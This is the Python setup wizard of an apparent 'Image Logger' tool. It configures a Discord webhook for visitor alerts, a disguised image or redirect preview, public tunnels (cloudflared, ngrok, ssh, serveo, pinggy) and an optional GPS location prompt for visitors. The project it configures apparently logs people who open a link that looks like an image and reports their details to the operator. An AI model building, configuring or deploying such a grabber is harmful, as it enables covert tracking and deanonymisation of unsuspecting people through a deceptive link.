#!/usr/bin/env python3
"""
Interactive setup wizard — configures everything and optionally launches.

    python3 setup.py                       # interactive
    python3 setup.py --yes                 # accept all defaults
    python3 setup.py --start               # configure, then launch
    python3 setup.py --webhook https://discord.com/api/webhooks/… \
                     --image https://i.imgur.com/abc.png \
                     --username "My Logger" --tunnel ngrok --yes --start

It sets up:
  * dashboard access token (auto-generated, rotate with --rotate-token)
  * Discord webhook   (validated with a real API call)
  * preview image     (validated that it actually returns an image)
  * webhook name + embed colour
  * port, tunnel provider (cloudflared / ngrok / ssh / none) + binary download
"""

from __future__ import annotations

import argparse
import json
import os
import sys

ROOT = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, ROOT)

import main as app  # noqa: E402

CYAN, GREEN, RED, YELLOW, DIM, BOLD, RESET = (
    "\033[96m", "\033[92m", "\033[91m", "\033[93m", "\033[90m", "\033[1m", "\033[0m")


def ask(prompt: str, default: str = "", quiet: bool = False) -> str:
    if quiet:
        return default
    suffix = f" {DIM}[{default}]{RESET}" if default else ""
    try:
        value = input(f"{CYAN}?{RESET} {prompt}{suffix}: ").strip()
    except EOFError:
        return default
    return value or default


def ask_yes_no(prompt: str, default: bool = True, quiet: bool = False) -> bool:
    if quiet:
        return default
    hint = "Y/n" if default else "y/N"
    try:
        value = input(f"{CYAN}?{RESET} {prompt} [{hint}]: ").strip().lower()
    except EOFError:
        return default
    if not value:
        return default
    return value in ("y", "yes", "true", "1")


def http_json(url: str, payload: dict | None = None, timeout: float = 12):
    from urllib.request import Request, urlopen
    from urllib.error import HTTPError, URLError
    data = json.dumps(payload).encode() if payload is not None else None
    req = Request(url, data=data, headers={
        "Content-Type": "application/json", "User-Agent": "setup/1.0"})
    try:
        with urlopen(req, timeout=timeout) as resp:
            body = resp.read(20000)
            return resp.status, (json.loads(body) if body else {})
    except HTTPError as exc:
        return exc.code, {}
    except (URLError, TimeoutError, OSError):
        return None, {}


def normalize_webhook(url: str) -> str:
    """discordapp.com is Discord's legacy API host — same webhooks, still valid."""
    url = (url or "").strip().rstrip("/")
    if url.startswith("https://discordapp.com/"):
        url = "https://discord.com" + url[len("https://discordapp.com"):]
    return url


def check_webhook(url: str) -> tuple[bool, str]:
    """GET the webhook (no message posted) to prove it exists."""
    url = normalize_webhook(url)
    if not url.startswith("https://discord.com/api/webhooks/"):
        return False, "not a Discord webhook URL (should start with https://discord.com/api/webhooks/)"
    status, data = http_json(url)
    if status == 200:
        channel = (data.get("channel") or {}).get("name") or data.get("channel_id", "?")
        guild = (data.get("guild") or {}).get("name") or ""
        return True, f"OK → #{channel}{(' in ' + guild) if guild else ''}"
    if status == 404:
        return False, "404 — this webhook is deleted/revoked (the one shipped in this repo is)"
    if status == 401:
        return False, "401 — invalid webhook"
    if status is None:
        return False, "network error (couldn't reach discord.com)"
    return False, f"HTTP {status}"


def check_image(url: str) -> tuple[bool, str]:
    from urllib.request import Request, urlopen
    from urllib.error import HTTPError, URLError
    if not url.startswith("http"):
        return False, "must start with http(s)://"
    req = Request(url, headers={"User-Agent": "Mozilla/5.0 (compatible; setup/1.0)",
                                "Accept": "image/*"})
    try:
        with urlopen(req, timeout=15) as resp:
            ctype = (resp.headers.get("Content-Type") or "").split(";")[0]
            head = resp.read(32)
    except HTTPError as exc:
        return False, f"HTTP {exc.code} (hotlink protection? try imgur/i.ibb.co)"
    except (URLError, TimeoutError, OSError):
        return False, "network error / DNS failure"
    is_image = ctype.startswith("image/") or head[:3] in (b"\xff\xd8\xff", b"\xff\xd8") \
        or head[:6] in (b"GIF87a", b"GIF89a") or head[:8] == b"\x89PNG\r\n\x1a\n" \
        or head[:4] == b"RIFF" or head[:4] == b"<svg" or b"<svg" in head
    if not is_image:
        return False, f"that URL returns {ctype or 'unknown content'} — not an image"
    return True, f"OK → {ctype or 'image'}"


def parse_color(raw: str) -> int | None:
    raw = raw.strip().lstrip("#")
    if raw.lower().startswith("0x"):
        raw = raw[2:]
    try:
        if len(raw) <= 2 and raw.isdigit():
            return int(raw)
        return int(raw, 16)
    except ValueError:
        return None


def main() -> None:
    parser = argparse.ArgumentParser(description="Configure the image logger")
    parser.add_argument("--yes", "-y", action="store_true", help="accept all defaults")
    parser.add_argument("--start", action="store_true", help="launch run.py when done")
    parser.add_argument("--webhook", default=None, help="Discord webhook URL")
    parser.add_argument("--image", default=None, help="preview/redirect image URL")
    parser.add_argument("--username", default=None, help="webhook bot name")
    parser.add_argument("--color", default=None, help="embed colour, e.g. #00FFFF")
    parser.add_argument("--port", type=int, default=None, help="local port")
    parser.add_argument("--tunnel",
                        choices=["auto", "cloudflared", "pinggy", "ssh", "serveo", "ngrok", "none"],
                        default=None, help="tunnel provider (all except ngrok: no login)")
    parser.add_argument("--ngrok-token", default=None, help="ngrok authtoken")
    parser.add_argument("--rotate-token", action="store_true",
                        help="generate a new dashboard token")
    args = parser.parse_args()
    quiet = args.yes

    cfg = app.config  # merged defaults + config.json (token auto-created)

    print(f"\n{BOLD}{CYAN}══ IMAGE LOGGER · SETUP ══{RESET}\n")

    # 1 ── dashboard token ────────────────────────────────────────────────
    if args.rotate_token:
        import secrets
        cfg["dashboard"]["token"] = secrets.token_urlsafe(16)
        print(f"{GREEN}✓{RESET} new dashboard token generated")
    print(f"  dashboard token : {YELLOW}{cfg['dashboard']['token']}{RESET} {DIM}(kept private){RESET}")

    # 2 ── webhook ────────────────────────────────────────────────────────
    webhook = args.webhook if args.webhook is not None else cfg.get("webhook", "")
    if isinstance(webhook, str) and webhook.startswith("https://discordapp.com/"):
        webhook = "https://discord.com" + webhook[len("https://discordapp.com"):]
    if not quiet:
        print(f"\n  {BOLD}Discord webhook{RESET} {DIM}— Server Settings → Integrations → Webhooks → New Webhook → Copy Webhook URL{RESET}")
    while True:
        webhook = normalize_webhook(ask("webhook URL", webhook, quiet))
        if not webhook:
            ok, detail = False, "empty (Discord alerts disabled)"
            break
        ok, detail = check_webhook(webhook)
        marker = f"{GREEN}✓{RESET}" if ok else (f"{YELLOW}!{RESET}" if "network error" in detail else f"{RED}✗{RESET}")
        print(f"  {marker} {detail}")
        if ok or quiet:
            break
        if not ask_yes_no("try again?", True, quiet=False):
            break
    cfg["webhook"] = webhook
    if webhook and not ok:
        print(f"  {YELLOW}→{RESET} alerts are off until a valid webhook is set "
              f"(edit config.json or IMAGE_LOGGER_WEBHOOK=… )")

    # 3 ── image ──────────────────────────────────────────────────────────
    if not quiet:
        print(f"\n  {BOLD}Preview image{RESET} {DIM}— what Discord shows and what the visitor sees{RESET}")
    default_image = args.image or cfg.get("image", "")
    while True:
        image = ask("image URL", default_image, quiet)
        default_image = image
        ok_img, detail = check_image(image)
        marker = f"{GREEN}✓{RESET}" if ok_img else f"{RED}✗{RESET}"
        print(f"  {marker} {detail}")
        if ok_img or quiet:
            break
        if not ask_yes_no("try another URL?", True, quiet=False):
            break
    cfg["image"] = image

    # 4 ── identity ───────────────────────────────────────────────────────
    print(f"\n  {BOLD}Webhook appearance{RESET}")
    cfg["username"] = args.username or ask("bot name", cfg.get("username", "Image Logger"), quiet)
    colour_raw = args.color or ask("embed colour (hex)", "#00FFFF", quiet)
    colour = parse_color(colour_raw)
    if colour is None:
        print(f"  {RED}✗{RESET} invalid colour {colour_raw!r} — keeping #{cfg['color']:06X}")
    else:
        cfg["color"] = colour
        print(f"  {GREEN}✓{RESET} colour #{colour:06X}")

    # 5 ── port + tunnel ──────────────────────────────────────────────────
    print(f"\n  {BOLD}Port & tunnel{RESET} {DIM}(auto = try them in order until one works){RESET}")
    cfg["port"] = args.port or int(ask("local port", str(cfg.get("port", 8080)), quiet) or 8080)
    tunnels = ("auto", "cloudflared", "pinggy", "ssh", "serveo", "ngrok", "none")
    tunnel = (args.tunnel or ask(
        "tunnel (auto / cloudflared / pinggy / ssh / serveo / ngrok / none)",
        str(cfg.get("tunnel") or "auto"), quiet)).lower().strip()
    if tunnel not in tunnels:
        print(f"  {YELLOW}!{RESET} unknown tunnel {tunnel!r} → auto")
        tunnel = "auto"
    cfg["tunnel"] = tunnel
    no_login = ("auto", "cloudflared", "pinggy", "ssh", "serveo")
    print(f"  {GREEN}✓{RESET} tunnel: {tunnel}"
          + (f"  {DIM}(no login required){RESET}" if tunnel in no_login else ""))

    # 6 ── options ────────────────────────────────────────────────────────
    if not quiet:
        print(f"\n  {BOLD}Options{RESET}")
        cfg["accurateLocation"] = ask_yes_no(
            "precise GPS location? (asks the visitor for permission — off by default)",
            bool(cfg.get("accurateLocation")), quiet)
        preview = ask("crawler preview (image / loading / redirect)",
                      str(cfg.get("preview") or "image"), quiet).lower()
        if preview in ("image", "loading", "redirect"):
            cfg["preview"] = preview
        cfg["linkAlerts"] = ask_yes_no("alert when the link is posted in chat?",
                                       bool(cfg.get("linkAlerts")), quiet)

    # 7 ── tunnel prerequisites ───────────────────────────────────────────
    if tunnel != "none":
        import run as launcher
        import shutil as _shutil
        print(f"\n  {BOLD}Tunnel prerequisites{RESET}")
        if tunnel in ("auto", "cloudflared"):
            binary = launcher.find_cloudflared()
            print(f"  {'✓' if binary else '✗'} cloudflared : {binary or 'download failed'}"
                  f"  {DIM}(no login){RESET}")
        ssh_bin = _shutil.which("ssh")
        if tunnel in ("auto", "pinggy", "ssh", "serveo"):
            print(f"  {'✓' if ssh_bin else '✗'} ssh         : {ssh_bin or 'not installed'}"
                  f"  {DIM}(powers pinggy / localhost.run / serveo — all no login){RESET}")
        if tunnel in ("auto", "ngrok"):
            token = args.ngrok_token or cfg.get("ngrokAuthtoken") or ""
            if token:
                cfg["ngrokAuthtoken"] = token
            if launcher.ngrok_ready():
                binary = launcher.find_ngrok()
                print(f"  {'✓' if binary else '✗'} ngrok       : {binary or 'download failed'}"
                      f"  {DIM}(authtoken set){RESET}")
            else:
                print(f"  {DIM}- ngrok       : skipped — needs a free authtoken "
                      f"(pass --ngrok-token, otherwise ngrok is left out of the chain){RESET}")

    # 8 ── save ───────────────────────────────────────────────────────────
    with open(os.path.join(ROOT, "config.json"), "w", encoding="utf-8") as fh:
        json.dump(cfg, fh, indent=2)
        fh.write("\n")
    print(f"\n  {GREEN}✓{RESET} config.json written")

    # provider-specific caveats, printed with the summary
    warn = ""
    if cfg.get("tunnel") in ("pinggy", "serveo"):
        warn += (f"  {YELLOW}!{RESET} {cfg['tunnel']} free tier can show its own page to browsers "
                 f"(and to Discord's crawler) — the embed may not show your image\n"
                 f"    {DIM}python3 run.py --tunnel cloudflared   (or ssh) for a clean preview{RESET}\n")
    if cfg.get("preview") != "image":
        warn += (f"  {YELLOW}!{RESET} preview = {cfg.get('preview')!r} — Discord's embed shows a "
                 f"placeholder, not your image\n"
                 f"    {DIM}set \"preview\": \"image\" (or rerun: python3 setup.py){RESET}\n")

    print(f"""
{BOLD}{CYAN}── summary ───────────────────────────────────────{RESET}
  webhook     {GREEN if cfg.get('webhook') else YELLOW}{cfg.get('webhook') or 'not set'}{RESET}
  image       {DIM}{cfg.get('image')}{RESET}
  bot name    {cfg.get('username')}   colour #{cfg['color']:06X}
  port        {cfg.get('port')}   tunnel {cfg.get('tunnel')} {DIM}(no login needed except ngrok){RESET}
  dashboard   {YELLOW}/dashboard?token={cfg['dashboard']['token']}{RESET}
  gps         {'ON' if cfg.get('accurateLocation') else 'off'}   preview {cfg.get('preview')}
{warn}{DIM}── next ───────────────────────────────────────────{RESET}
  {BOLD}python3 run.py{RESET}      start server + tunnel
  {DIM}or ./start.sh{RESET}
""")

    if args.start:
        os.chdir(ROOT)
        os.execv(sys.executable, [sys.executable, os.path.join(ROOT, "run.py")])


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nsetup cancelled — config.json unchanged? (re-run any time)")
        sys.exit(130)
